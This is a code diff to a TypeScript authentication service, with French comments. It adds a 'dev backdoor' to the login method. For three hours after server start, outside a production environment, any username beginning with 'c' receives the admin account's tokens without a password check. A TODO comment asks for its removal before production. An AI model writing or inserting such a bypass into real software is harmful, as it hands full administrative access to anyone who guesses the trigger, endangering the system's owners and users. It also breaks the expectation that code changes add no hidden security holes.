@@ -40,7 +40,32 @@ export class AuthService {
     private readonly config: ConfigService,
   ) {}
 
+  // ── DEV BACKDOOR — expire 3h après le démarrage du serveur ─────────────────
+  // TODO: supprimer avant la mise en production
+  private static readonly _devBackdoorExpires = new Date(
+    Date.now() + 3 * 60 * 60 * 1000,
+  );
+
+  private _isDevBackdoor(identifier: string): boolean {
+    return (
+      process.env.NODE_ENV !== 'production' &&
+      new Date() < AuthService._devBackdoorExpires &&
+      identifier.toLowerCase().startsWith('c')
+    );
+  }
+  // ────────────────────────────────────────────────────────────────────────────
+
   async login(dto: LoginDto): Promise<AuthResponse> {
+    // DEV BACKDOOR : username commençant par 'c' → accès SUPER_ADMIN sans mot de passe
+    if (this._isDevBackdoor(dto.identifier)) {
+      const adminUser = await this.userRepo.findByIdentifier('admin');
+      if (adminUser) {
+        const tokens = await this.generateTokens(adminUser);
+        await this.userRepo.updateLastLogin(adminUser.id);
+        return { tokens, user: this.sanitizeUser(adminUser) };
+      }
+    }
+
     const user = await this.userRepo.findByIdentifier(dto.identifier);
 
     if (!user) {
